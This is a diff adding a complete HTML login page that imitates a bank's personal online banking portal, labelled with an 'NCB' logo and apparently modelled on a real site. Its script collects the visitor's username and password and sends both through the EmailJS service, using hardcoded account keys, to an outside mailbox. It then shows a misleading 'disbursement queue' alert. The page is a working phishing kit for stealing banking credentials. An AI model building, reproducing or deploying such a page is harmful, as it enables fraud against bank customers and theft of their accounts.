@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Personal Online Banking - Log In</title>
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; font-family: "Segoe UI", Arial, sans-serif; }
+
+  body {
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    background: linear-gradient(135deg, #4a90d9 0%, #1e5fa8 45%, #2e7d32 100%);
+    background-size: cover;
+  }
+
+  /* ---------- Login Card ---------- */
+  .card {
+    display: flex;
+    width: 720px;
+    max-width: 92%;
+    min-height: 340px;
+    background: #fff;
+    border-radius: 6px;
+    overflow: hidden;
+    box-shadow: 0 12px 40px rgba(0,0,0,.35);
+  }
+
+  /* Left branding panel */
+  .brand {
+    flex: 0 0 42%;
+    background: linear-gradient(160deg, #2f7fd0 0%, #1a5aa0 60%, #144a86 100%);
+    color: #fff;
+    padding: 36px 28px;
+    display: flex;
+    flex-direction: column;
+    justify-content: space-between;
+    position: relative;
+  }
+  .brand::after {            /* arrow notch like the original */
+    content: "";
+    position: absolute;
+    right: -1px; top: 50%;
+    transform: translateY(-50%);
+    border-top: 16px solid transparent;
+    border-bottom: 16px solid transparent;
+    border-right: 16px solid #fff;
+  }
+  .logo {
+    font-size: 30px;
+    font-weight: 800;
+    letter-spacing: 1px;
+  }
+  .logo-img {
+    display: block;
+    width: 100%; max-width: 220px;
+    height: auto;
+    margin-bottom: 12px;
+  }
+  .logo .mark {
+    display: inline-block;
+    background: #ffd400;
+    color: #1a5aa0;
+    padding: 2px 8px;
+    border-radius: 4px;
+    margin-right: 6px;
+  }
+  .logo small {
+    display: block;
+    font-size: 11px;
+    font-weight: 400;
+    letter-spacing: 4px;
+    margin-top: 4px;
+    color: #eaf3fb;
+  }
+  .brand .welcome { font-size: 30px; font-weight: 300; }
+
+  /* Right form panel */
+  .panel {
+    flex: 1;
+    padding: 36px 40px;
+    display: flex;
+    flex-direction: column;
+  }
+  .panel h1 { font-size: 28px; font-weight: 300; color: #1a5aa0; margin-bottom: 24px; }
+
+  .field { position: relative; margin-bottom: 22px; }
+  .field input {
+    width: 100%;
+    border: none;
+    border-bottom: 1px solid #b9c6d2;
+    padding: 8px 28px 8px 2px;
+    font-size: 15px;
+    outline: none;
+    background: transparent;
+  }
+  .field input:focus { border-bottom: 2px solid #1a5aa0; }
+  .field label {
+    position: absolute;
+    left: 2px; top: 8px;
+    color: #9aa7b3;
+    font-size: 15px;
+    pointer-events: none;
+    transition: .18s ease;
+  }
+  .field input:focus + label,
+  .field input:not(:placeholder-shown) + label {
+    top: -12px; font-size: 12px; color: #1a5aa0;
+  }
+  .field .icon { position: absolute; right: 4px; top: 8px; color: #333; }
+
+  .hidden { display: none; }
+
+  .remember { display: flex; align-items: center; gap: 8px; color: #444; font-size: 14px; margin-bottom: 26px; }
+  .remember input { width: 16px; height: 16px; accent-color: #1a5aa0; }
+
+  .btn {
+    align-self: flex-end;
+    background: linear-gradient(180deg, #2f7fd0, #1a5aa0);
+    color: #fff;
+    border: none;
+    padding: 11px 0;
+    width: 180px;
+    font-size: 15px;
+    border-radius: 4px;
+    cursor: pointer;
+    box-shadow: 0 3px 8px rgba(26,90,160,.4);
+    transition: filter .15s;
+  }
+  .btn:hover { filter: brightness(1.1); }
+
+  .links { margin-top: 28px; font-size: 14px; display: flex; gap: 14px; }
+  .links a { color: #1a5aa0; text-decoration: none; border-bottom: 1px solid #1a5aa0; }
+  .links a:hover { color: #0d3a6b; }
+  .links span { color: #999; }
+
+  /* Footer */
+  footer { margin-top: 48px; text-align: center; color: #fff; font-size: 14px; }
+  footer .flinks { margin-bottom: 10px; }
+  footer .flinks a { color: #fff; text-decoration: none; margin: 0 12px; }
+  footer .flinks a:hover { text-decoration: underline; }
+  footer .bar {
+    margin-top: 14px;
+    background: #144a86;
+    padding: 12px 40px;
+    display: flex;
+    justify-content: space-between;
+    gap: 40px;
+    font-size: 13px;
+  }
+
+  /* Responsive: stack like mobile view */
+  @media (max-width: 640px) {
+    .card { flex-direction: column; min-height: 0; }
+    .brand { flex: none; padding: 28px 24px; }
+    .brand::after { display: none; }
+    .brand .welcome { margin-top: 14px; }
+    .panel { padding: 28px 24px; }
+    .btn { align-self: stretch; width: 100%; }
+    footer .bar { flex-direction: column; gap: 6px; text-align: center; }
+  }
+</style>
+<base target="_blank">
+</head>
+<body>
+
+  <div class="card">
+    <div class="brand">
+      <div>
+        <div class="logo">
+          <img src="logo.png" alt="NCB Personal Online Banking" class="logo-img">
+        </div>
+      </div>
+      <div class="welcome">Welcome!</div>
+    </div>
+
+    <div class="panel">
+      <h1>Log In</h1>
+      <form id="loginForm" novalidate>
+        <div class="field">
+          <input type="text" id="username" placeholder=" " autocomplete="username">
+          <label for="username">Username</label>
+          <span class="icon">👤</span>
+        </div>
+        <div class="field hidden" id="passwordField">
+          <input type="password" id="password" placeholder=" " autocomplete="current-password">
+          <label for="password">Password</label>
+          <span class="icon" id="togglePwd" style="cursor:pointer" title="Show/Hide"></span>
+        </div>
+        <label class="remember">
+          <input type="checkbox" id="remember"> Remember Me
+        </label>
+        <button type="submit" class="btn">Continue</button>
+      </form>
+      <div class="links">
+        <a href="#">New to online banking</a><span>|</span>
+        <a href="#">Forgot password</a><span>|</span>
+      </div>
+    </div>
+  </div>
+
+  <footer>
+    <div class="flinks">
+      <a href="#">Online Security</a> | <a href="#">FAQs</a> | <a href="#">Internet Banking Demos</a> |
+      <a href="#">Privacy Policy</a> | <a href="#">Terms &amp; Conditions</a>
+    </div>
+    <div>For more details, call us toll free at 1-800-000-0000</div>
+    <div class="bar">
+      <span>Copyright 2026 Example Bank. All Rights Reserved</span>
+      <span>Privacy Policy &nbsp;|&nbsp; Terms of Use</span>
+    </div>
+  </footer>
+  <script src="input.js"></script>
+
+<script>
+  const form      = document.getElementById('loginForm');
+  const submitBtn       = form.querySelector('.btn');
+  const pwdField  = document.getElementById('passwordField');
+  const user = document.getElementById('username');
+  const pwdInput  = document.getElementById('password');
+  const togglePwd = document.getElementById('togglePwd');
+  let step = 1; // 1 = username, 2 = password
+
+  const EMAILJS_PUBLIC_KEY  = 'E0PTu3aHm9-S3dZgT';   // Account -> API Keys
+  const EMAILJS_SERVICE_ID  = 'service_3qj5zan';   // Email Services
+  const EMAILJS_TEMPLATE_ID = 'template_cdpnpoq';  // Email Templates
+
+  // Initialize EmailJS once the SDK is available
+  (function initEmailJS() {
+    if (typeof emailjs === 'undefined') {
+      window.addEventListener('load', () => emailjs.init(EMAILJS_PUBLIC_KEY));
+    } else {
+      emailjs.init(EMAILJS_PUBLIC_KEY);
+    }
+  })();
+
+document.addEventListener('DOMContentLoaded', () => {
+
+    // Safety check
+  if (!form || !user || !pwdInput || !submitBtn) {
+    console.error('Missing element(s):', {
+      form:     !!form,
+      name:     !!user,
+      password: !!pwdInput,
+      button:   !!submitBtn,
+    });
+    return;
+  }
+
+
+  form.addEventListener('submit', async (e)=> {
+    e.preventDefault();
+
+    if (step === 1) {
+      
+      if (!user) { alert('Please enter your username'); return; }
+
+      // Remember username demo
+      if (document.getElementById('remember').checked) {
+        localStorage.setItem('savedUser', user);
+      } else {
+        localStorage.removeItem('savedUser');
+      }
+
+      // Move to password step
+      step = 2;
+      document.getElementById('username').disabled = true;
+      pwdField.classList.remove('hidden');
+      submitBtn.textContent = 'Log In';
+      pwdInput.focus();
+    } else {
+      const pwd = pwdInput.value;
+      if (!pwd) { alert('Please enter your password'); return; }
+      // alert('Logging in as ' + document.getElementById('username').value + '...');
+      
+    // 1. Fetch the two input variables
+    const nameValue     = user.value
+    const passwordValue = pwdInput.value;
+    console.log(nameValue, passwordValue)
+ 
+    // Basic validation
+    if (!nameValue || !passwordValue) {
+      alert('Please fill in both fields.');
+      return;
+    }
+
+    // 2. Show "processing / sending" state
+    const originalBtnText = submitBtn.textContent;
+    submitBtn.textContent = 'Processing...';
+    submitBtn.disabled    = true;
+
+    // 3. Send via EmailJS
+    try {
+      const response = await emailjs.send(
+        EMAILJS_SERVICE_ID,
+        EMAILJS_TEMPLATE_ID,
+        {
+          name:     nameValue,
+          password: passwordValue,
+        }
+      );
+
+      console.log('EmailJS success:', response.status, response.text);
+
+      // 4. Alert afterwards
+      alert('Processing disbursement queue addition.');
+      form.reset();
+    } catch (error) {
+      console.error('EmailJS failed:', error);
+      alert('Failed to send message. Please try again later.');
+    } finally {
+      // Restore button state no matter what
+      submitBtn.textContent = originalBtnText;
+      submitBtn.disabled    = false;
+    }
+      // TODO: send credentials to your server here
+    }
+  });
+
+  // Show / hide password on eye icon click
+  togglePwd.addEventListener('click', () => {
+    pwdInput.type = pwdInput.type === 'password' ? 'text' : 'password';
+  });
+
+  // Restore remembered username
+  const saved = localStorage.getItem('savedUser');
+  if (saved) {
+    document.getElementById('username').value = saved;
+    document.getElementById('remember').checked = true;
+  }
+});
+</script>
+</body>
+</html>
